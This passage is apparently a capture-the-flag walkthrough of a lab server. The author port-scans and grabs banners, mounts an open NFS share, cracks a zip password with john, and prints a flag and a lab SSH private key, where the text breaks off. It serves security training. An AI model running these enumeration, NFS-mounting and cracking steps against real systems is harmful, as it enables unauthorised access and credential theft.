----
Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/15aae7a0b9c12597a7a7cd9f7db85c48.jpeg)

### Task 1  Hacking the server

 Start Machine

Start at port 1337 and enumerate your way.

Good luck.  

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ rustscan -a 10.10.173.229 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.173.229:111
Open 10.10.173.229:2049
Open 10.10.173.229:33613
Open 10.10.173.229:41851
Open 10.10.173.229:57621
Open 10.10.173.229:60329

┌──(witty㉿kali)-[~]
└─$ nc 10.10.173.229 1337
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports  

┌──(witty㉿kali)-[~]
└─$ nc 10.10.173.229 1-100 -v           
10.10.173.229: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.173.229] 100 (?) open
220 NZl-OlG ESMTP
250-vAFRKNmc
250-AUTH LOGIN CRAM-MD5 PLAIN
250-AUTH=LOGIN CRAM-MD5 PLAIN
250-PIPELINING
250 8BITMIME

(UNKNOWN) [10.10.173.229] 99 (?) open
This is MoneyWorks; Server is on Windows

(UNKNOWN) [10.10.173.229] 98 (?) open
������!����

EXFO BVV

WARNING: This system is for use by authorized users only!

Password: 
(UNKNOWN) [10.10.173.229] 97 (?) open
HTTP/1.7 200 OK
Date: k
MIME-version: 1.7
Server: ZOT-PS-46Y

(UNKNOWN) [10.10.173.229] 96 (?) open
HTTP/1.1 069 i
Server: Mongrel 63620564

(UNKNOWN) [10.10.173.229] 95 (?) open
HTTP/1.0 200 Ok
Server: Embeded_httpd
Date: q
Content-Type: text/html
Connection: close

<html>

<head>
<META NAME="GENERATOR" Content="Multi-Functional Broadband NAT Router (R233801)">
(UNKNOWN) [10.10.173.229] 94 (?) open
uaversionbindjPowerDNS Recursor 9
(UNKNOWN) [10.10.173.229] 93 (?) open
220 Xerox Phaser pr
421 Service not available, closing control connection

(UNKNOWN) [10.10.173.229] 92 (?) open
220 Indy FTP-Server bereit.

(UNKNOWN) [10.10.173.229] 91 (?) open
220 -rVt FTP server ready.
500 '': command not understood.
500 '': command not understood.

(UNKNOWN) [10.10.173.229] 90 (?) open
cvs [server aborted]: bad auth protocol start: HELP

(UNKNOWN) [10.10.173.229] 89 (?) open
HTTP/1.1 400 Bad request
s<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Header 'Host' is missing.</title>
(UNKNOWN) [10.10.173.229] 88 (kerberos) open
TrueWeather

>
(UNKNOWN) [10.10.173.229] 87 (?) open
����Welcome to the Agilent PNA Network Analyzer at pcZXo

SCPI> 
(UNKNOWN) [10.10.173.229] 86 (?) open
HTTP/1.1 785 x
Server: gSOAP/435

(UNKNOWN) [10.10.173.229] 85 (?) open
HTTP/1.1 302 Object Moved
Location: /vpn/index.html
Connection: close

(UNKNOWN) [10.10.173.229] 84 (?) open
HTTP/1.1 404 Unknown host.
Server: Varnish

(UNKNOWN) [10.10.173.229] 83 (?) open
$
 jlek��00000000�00000000000000
(UNKNOWN) [10.10.173.229] 82 (?) open
220  ESMTP Service (Lotus Domino Build VcshZSNYX Beta q) ready at 
(UNKNOWN) [10.10.173.229] 81 (?) open
HTTP/1.1 401 Unauthorized
Server: RabbIT proxy version GO
Content-type: text/html; charset=utf-8
Cache-Control: no-cache
Pragma: no-cache
Date: a
WWW-Authenticate: Basic realm="V:1"

(UNKNOWN) [10.10.173.229] 80 (http) open
<boinc_gui_rpc_reply>
<client_version>9/client_version>
<unauthorized/>
</boinc_gui_rpc_reply>

(UNKNOWN) [10.10.173.229] 79 (finger) open
HTTP/1.1 302 Moved Temporarily
rServer: iTP WebServer with NSJSP/uwqNgWIPr (HTTP/1.1 Connector)
Location: http://EsmJoP:3index.html

(UNKNOWN) [10.10.173.229] 78 (?) open
HTTP/1.1 404 Not Found
Content-Length: 0
Cache-Control: no-cache,no-store,no-cache
Content-Type: application/json
Pragma: no-cache,no-cache

HTTP/1.1 404 Not Found
Content-Length: 0
Cache-Control: no-cache,no-store,no-cache
Content-Type: application/json
Pragma: no-cache,no-cache

(UNKNOWN) [10.10.173.229] 77 (?) open
������

Lantronix MSS1 Version STI3.5/5(981103)

Type HELP at the 'Local_2> ' prompt for assistance.

Login password> 
(UNKNOWN) [10.10.173.229] 76 (?) open
0r00000eTNSLSNR for 2,24}: Version 0 - Production
(UNKNOWN) [10.10.173.229] 75 (?) open
220 PkC ESMTP Citadel server ready.

(UNKNOWN) [10.10.173.229] 74 (?) open
000�<MsgHeader_PI>
<type>RODS_VERSION</type>
<msgLen>6/msgLen>
<errorLen>0</errorLen>
<bsLen>0</bsLen>
<intInfo>0</intInfo>
</MsgHeader_PI>
<Version_PI>
<status>-1/status>
<relVersion>rodstYxGlqDw</relVersion>
<apiVersion>d</apiVersion>
<reconnPort>0</reconnPort>
<reconnAddr></reconnAddr>
<cookie>0</cookie>
</Version_PI>

(UNKNOWN) [10.10.173.229] 73 (?) open
+OK POP3 Cm [cppop 6] at [
(UNKNOWN) [10.10.173.229] 72 (?) open
HTTP/1.1 404 Not Found
Date: s GMT
Server: Unknown
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>
<H1>Not Found</H1>
The requested URL / was not found on this server.<P>
</BODY></HTML>

(UNKNOWN) [10.10.173.229] 71 (?) open
$
 ylbghB000000000�00000000000000
(UNKNOWN) [10.10.173.229] 70 (gopher) open
�0�0�00�az�0000Jlprvpgxacsmcnij000<,dnwabct0swl000000000000000000000000000000000000000000000000000000000000000000000000����0x0�
(UNKNOWN) [10.10.173.229] 69 (?) open
HTTP/1.0 200 OK
t<title>Remote Buddy by IOSPIRIT</title>
(UNKNOWN) [10.10.173.229] 68 (?) open
����version00000U000�~000000000nsgitati00000000000000000��iaochv00000000000000000��smxsthodkumfsp.urfik
(UNKNOWN) [10.10.173.229] 67 (?) open
HTTP/1.1 217 n
WWW-Authenticate: Basic realm="Netopia-w"
Content-Type: text/html
Server: Allegro-Software-RomPager/257168892

(UNKNOWN) [10.10.173.229] 66 (?) open
������Welcome to VCSCDCS2
TANDBERG Codec Release L00

(UNKNOWN) [10.10.173.229] 65 (?) open
����

Login: 

You must supply a username

Login: 

You must supply a username

Login: 
(UNKNOWN) [10.10.173.229] 64 (?) open
HTTP/1.0 404 no application for: /
Server: HttpServer

(UNKNOWN) [10.10.173.229] 63 (?) open
�00$000brkl0000000000000000000000000
(UNKNOWN) [10.10.173.229] 62 (?) open
HTTP/1.0 200 OK
Cache-Control: no-cache
Expires: -1
Content-Type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <title>Thomson Gateway - Startseite</title>
(UNKNOWN) [10.10.173.229] 61 (?) open
Annuaire �lectronique
(UNKNOWN) [10.10.173.229] 60 (?) open
HTTP/1.1 845 x
Connection: Keep-Alive
Server: Siemens Gigaset C450 IP

(UNKNOWN) [10.10.173.229] 59 (?) open
HTTP/1.0 524 o
Server: Roxen/2WCqTRDKAU

(UNKNOWN) [10.10.173.229] 58 (?) open
220-t
?:220-|    WarFTPd 0SAadKgt (thKi) Ready

(UNKNOWN) [10.10.173.229] 57 (?) open
HTTP/1.0 613 t
Server: Apple Embedded Web Server/438676

(UNKNOWN) [10.10.173.229] 56 (?) open
��"��
                  Areca Technology Corporation RAID Controller             
(UNKNOWN) [10.10.173.229] 55 (?) open
?SH-6529890-OpenSSH_lTp FreeBSD-openssh-portable-?:oyxBr

(UNKNOWN) [10.10.173.229] 54 (?) open
����

Copyright (c) 2004 - 2006 3Com Corporation. All rights reserved.

0Username: 
0Password: 
0

Copyright (c) 2004 - 2006 3Com Corporation. All rights reserved.

0Username: 
(UNKNOWN) [10.10.173.229] 53 (domain) open
match ftp m%^220-loading..
220-|           W e L c O m E @ SFXP|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|
% p/SwiftFXP/
(UNKNOWN) [10.10.173.229] 52 (?) open
������!����
Sportster Pro 304 Image Sagem D-BOX2 - Kernel Almwhh 
(UNKNOWN) [10.10.173.229] 51 (?) open
HTTP/1.0 500 Internal Error
Connection: close
Cache-Control: no-cache, no-store

<html><body><h1>Internal Server Error</h1>Failure(&quot;No handler table for HTTP method Unknown OPTIONS&quot;)</body></html>
(UNKNOWN) [10.10.173.229] 50 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 49 (tacacs) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 48 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 47 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00(UNKNOWN) [10.10.173.229] 46 (?) open
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00(UNKNOWN) [10.10.173.229] 45 (?) open
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00(UNKNOWN) [10.10.173.229] 44 (?) open
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00(UNKNOWN) [10.10.173.229] 43 (whois) open
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00(UNKNOWN) [10.10.173.229] 42 (?) open
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00(UNKNOWN) [10.10.173.229] 41 (?) open
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00(UNKNOWN) [10.10.173.229] 40 (?) open
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00(UNKNOWN) [10.10.173.229] 39 (?) open
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00(UNKNOWN) [10.10.173.229] 38 (?) open
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00(UNKNOWN) [10.10.173.229] 37 (time) open
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00(UNKNOWN) [10.10.173.229] 36 (?) open
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00(UNKNOWN) [10.10.173.229] 35 (?) open
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00(UNKNOWN) [10.10.173.229] 34 (?) open
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00(UNKNOWN) [10.10.173.229] 33 (?) open
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00(UNKNOWN) [10.10.173.229] 32 (?) open
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00(UNKNOWN) [10.10.173.229] 31 (?) open
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00(UNKNOWN) [10.10.173.229] 30 (?) open
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00(UNKNOWN) [10.10.173.229] 29 (?) open
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00(UNKNOWN) [10.10.173.229] 28 (?) open
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00(UNKNOWN) [10.10.173.229] 27 (?) open
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00(UNKNOWN) [10.10.173.229] 26 (?) open
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00(UNKNOWN) [10.10.173.229] 25 (smtp) open
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00(UNKNOWN) [10.10.173.229] 24 (?) open
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00(UNKNOWN) [10.10.173.229] 23 (telnet) open
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00(UNKNOWN) [10.10.173.229] 22 (ssh) open
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00(UNKNOWN) [10.10.173.229] 21 (ftp) open
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00(UNKNOWN) [10.10.173.229] 20 (ftp-data) open
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00(UNKNOWN) [10.10.173.229] 19 (chargen) open
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00(UNKNOWN) [10.10.173.229] 18 (?) open
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00(UNKNOWN) [10.10.173.229] 17 (qotd) open
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00(UNKNOWN) [10.10.173.229] 16 (?) open
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00(UNKNOWN) [10.10.173.229] 15 (netstat) open
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00(UNKNOWN) [10.10.173.229] 14 (?) open
550 12345 0fffffff8000000000008888000000000080000000000007fffff00(UNKNOWN) [10.10.173.229] 13 (daytime) open
550 12345 0ffffffff000000888000000000800000080000008800007fffff00(UNKNOWN) [10.10.173.229] 12 (?) open
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00(UNKNOWN) [10.10.173.229] 11 (systat) open
550 12345 0fffffffff000088808880000000000000088800000008fffffff00(UNKNOWN) [10.10.173.229] 10 (?) open
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00(UNKNOWN) [10.10.173.229] 9 (discard) open
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00(UNKNOWN) [10.10.173.229] 8 (?) open
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00(UNKNOWN) [10.10.173.229] 7 (echo) open
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00(UNKNOWN) [10.10.173.229] 6 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00(UNKNOWN) [10.10.173.229] 5 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 4 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 3 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 2 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000(UNKNOWN) [10.10.173.229] 1 (tcpmux) open
550 12345 0000000000000000000000000000000000000000000000000000000 

go to port 12345

or

┌──(witty㉿kali)-[~]
└─$ for i in {1..100}; do (sleep 1; echo "get /") | telnet 10.10.173.229 $i | grep 550 >> x ; done

┌──(witty㉿kali)-[~]
└─$ tail x               
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000

or using python

┌──(witty㉿kali)-[~]
└─$ python3 port_knocking.py   
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
550 12345 0fffffffff000088808880000000000000088800000008fffffff00
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
550 12345 0ffffffff000000888000000000800000080000008800007fffff00
550 12345 0fffffff8000000000008888000000000080000000000007fffff00
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
HTTP/1.0 500 Internal Error

┌──(witty㉿kali)-[~]
└─$ nc 10.10.173.229 12345 -v        
10.10.173.229: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.173.229] 12345 (?) open
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan  

┌──(witty㉿kali)-[~]
└─$ showmount -e 10.10.173.229
Export list for 10.10.173.229:
/home/nfs *
                                                                                  
┌──(witty㉿kali)-[~]
└─$ cd Downloads
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mkdir /mnt/hell-nfs       
[sudo] password for witty: 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mount 10.10.173.229:/home/nfs /mnt/hell-nfs       
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd /mnt                 
                                                                                  
┌──(witty㉿kali)-[/mnt]
└─$ ls
hell-nfs  willow-failsafe
                                                                                  
┌──(witty㉿kali)-[/mnt]
└─$ cd hell-nfs    
                                                                                  
┌──(witty㉿kali)-[/mnt/hell-nfs]
└─$ ls
backup.zip
                                                                                  
┌──(witty㉿kali)-[/mnt/hell-nfs]
└─$ unzip backup.zip             
Archive:  backup.zip
checkdir error:  cannot create home
                 Read-only file system
                 unable to process home/hades/.ssh/.
[backup.zip] home/hades/.ssh/id_rsa password: 
   skipping: home/hades/.ssh/id_rsa  incorrect password
   skipping: home/hades/.ssh/hint.txt  incorrect password
   skipping: home/hades/.ssh/authorized_keys  incorrect password
   skipping: home/hades/.ssh/flag.txt  incorrect password
   skipping: home/hades/.ssh/id_rsa.pub  incorrect password

┌──(root㉿kali)-[/mnt/hell-nfs]
└─# file backup.zip      
backup.zip: Zip archive data, at least v1.0 to extract, compression method=store

┌──(root㉿kali)-[/mnt/hell-nfs]
└─# pwd  
/mnt/hell-nfs
                                                                                  
┌──(root㉿kali)-[/mnt/hell-nfs]
└─# cd /root                                                        
                                                                                  
┌──(root㉿kali)-[~]
└─# ls     
go  nuclei-templates  reults.txt  subdomains.txt  targets.txt
                                                                                  
┌──(root㉿kali)-[~]
└─# mkdir hell_thm
                                                                                  
┌──(root㉿kali)-[~]
└─# cd hell_thm 
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# cp /mnt/hell-nfs/backup.zip .                                           
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# ls -lah
total 16K
drwxr-xr-x  2 root root 4.0K Jul 12 19:19 .
drwx------ 20 root root 4.0K Jul 12 19:19 ..
-rw-r--r--  1 root root 4.5K Jul 12 19:19 backup.zip
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# chmod 777 backup.zip         
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# ls -lah
total 16K
drwxr-xr-x  2 root root 4.0K Jul 12 19:19 .
drwx------ 20 root root 4.0K Jul 12 19:19 ..
-rwxrwxrwx  1 root root 4.5K Jul 12 19:19 backup.zip
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# zip2john backup.zip > backup_hash
Created directory: /root/.john
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: TS_chk, cmplen=22, decmplen=10, crc=F51A7381 ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=2F9682FA ts=B16D cs=b16d type=0
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: TS_chk, cmplen=602, decmplen=736, crc=1C4C509B ts=B16D cs=b16d type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)     
1g 0:00:00:00 DONE (2023-07-12 19:19) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(root㉿kali)-[~/hell_thm]
└─# unzip backup.zip 
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub  
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# ls     
backup_hash  backup.zip  home
                                                                                  
┌──(root㉿kali)-[~/hell_thm]
└─# cd home             
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home]
└─# ls
hades
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home]
└─# cd hades 
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home/hades]
└─# ls
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home/hades]
└─# ls -lah
total 12K
drwxr-xr-x 3 root root 4.0K Jul 12 19:20 .
drwxr-xr-x 3 root root 4.0K Jul 12 19:20 ..
drwx------ 2 root root 4.0K Sep 15  2020 .ssh
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home/hades]
└─# cd .ssh 
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# ls -lah
total 28K
drwx------ 2 root root 4.0K Sep 15  2020 .
drwxr-xr-x 3 root root 4.0K Jul 12 19:20 ..
-rw-r--r-- 1 root root  736 Sep 15  2020 authorized_keys
-rw-r--r-- 1 root root   33 Sep 15  2020 flag.txt
-rw-r--r-- 1 root root   10 Sep 15  2020 hint.txt
-rw------- 1 root root 3.3K Sep 15  2020 id_rsa
-rw-r--r-- 1 root root  736 Sep 15  2020 id_rsa.pub
                                                                                  
┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# cat flag.txt 
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}

┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# cat hint.txt  
2500-4500

┌──(root㉿kali)-[~/hell_thm/home/hades/.ssh]
└─# cat id_rsa  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAvvpYFMo61B9W+h5uWUdo+jqj9RjFiaQ4JvGeLI9Ktl8aBZxPngNy
d5VDFEslFfgbYUhYgNmU2xTaWPK0HweuyauIizV4QLA9KEvVMAz+2W8yhcSrUDpU0fosol
GH5TmQxBS9NT/mzwSjskweoMbCz9mKQ9Zl49RmqGg8pZI3FoaSwTwD8+ysEoF1RKTNi6AB
NGHq/00qadmMLtM2KgFdJNi6S6fVjpwwvlVhCvcdqYoHjpzX94PoQpzqYlbi5hqvPVG/Vj
7eWBDHzL6kapx32IsSNfqT7rFfN+atMP3/ofJEojngBb4gvEoAZ3tzB08Ee6Z4OTtlbFA8
840rQXOTwxXAqdvFdO23k3uBbX/EMDV19ZkBz3+R/JGlryWCf4bCBmwSxNZufi1aQmqIMV
msnBq0DKPYqq9jziHqUqFvZMxHR1VjCYAnq83VKpDoI9Jl9KgvKzHOZtriQqTy9MM6/peh
NGUIICl3REw4v5Cq0HDPHVc5kfL37tp3VxcX5C5zoxIi6jKkSvXGjRftcK9pGdLRCktcWp
oeFXxvvCXT1bArugz70LfaP3NeqLTs0cagRkd2qOFHy/ZLHMgqwtuhHE0adT+CRLk5puGQ
010L4FOE0ii5iJfYengVqy4YHstKQJigg/jf/O5U+Lp8HIhodSb03Pup6LE9cF/Zs3xr5L
UAAAdABHgPZAR4D2QAAAAHc3NoLXJzYQAAAgEAvvpYFMo61B9W+h5uWUdo+jqj9RjFiaQ4
JvGeLI9Ktl8aBZxPngNyd5VDFEslFfgbYUhYgNmU2xTaWPK0HweuyauIizV4QLA9KEvVMA
z+2W8yhcSrUDpU0fosolGH5TmQxBS9NT/mzwSjskweoMbCz9mKQ9Zl49RmqGg8pZI3FoaS
wTwD8+ysEoF1RKTNi6ABNGHq/00qadmMLtM2KgFdJNi6S6fVjpwwvlVhCvcdqYoHjpzX94
PoQpzqYlbi5hqvPVG/Vj7eWBDHzL6kapx32IsSNfqT7rFfN+atMP3/ofJEojngBb4gvEoA
Z3tzB08Ee6Z4OTtlbFA8840rQXOTwxXAqdvFdO23k3uBbX/EMDV19ZkBz3+R/JGlryWCf4
bCBmwSxNZufi1aQmqIMVmsnBq0DKPYqq9jziHqUqFvZMxHR1VjCYAnq83VKpDoI9Jl9Kgv
KzHOZtriQqTy9MM6/pehNGUIICl3REw4v5Cq0HDPHVc5kfL37tp3VxcX5C5zoxIi6jKkSv
XGjRftcK9pGdLRCktcWpoeFXxvvCXT1bArugz70LfaP3NeqLTs0cagRkd2qOFHy/ZLHMgq
wtuhHE0adT+CRLk5puGQ010L4FOE0ii5iJfYengVqy4YHstKQJigg/jf/O5U+Lp8HIhodS
b03Pup6LE9cF/Zs3xr5LUAAAADAQABAAACAD53K/BA5VUUmyJcacOR8+hE3fQBEjufFy7F
wPLaO5nDKYPESNZqUjqC+9nbalnxOSNswmYCxQmTnIeTew7bOHSGQrcl2htuidJwW17IIW
OFV4UhetdW/P9hUNAW0thLJ+q6zdho+lmkLtbWxv3XhUju4qalrdYDV0CmN5AAbzxS8BV8
R960/uNerLizHvgYccxsaqzu1Hyix5NZSlIa+BhhOy4by2JF/DuFOaSYh384wpgG/SzcXE
/Ne2yG9thEyiTIZEkVbyxm8LMreCPW4exWMLKvL0vXgEmMjgGEUuTplUFqpLe8JIDxw4gV
fN5bHiBDpvcxUk9HP2h6ODfEUgPgHWPvzpR2vpsSiJADa54XjGG8V9W+CigO14pAjP02jc
HtKrMDPqtk8oqSpeBWkG887eErq8rhb4H/KY/ORegPT4SgA3zqY5/5sv8I7wT/jkmmT40e
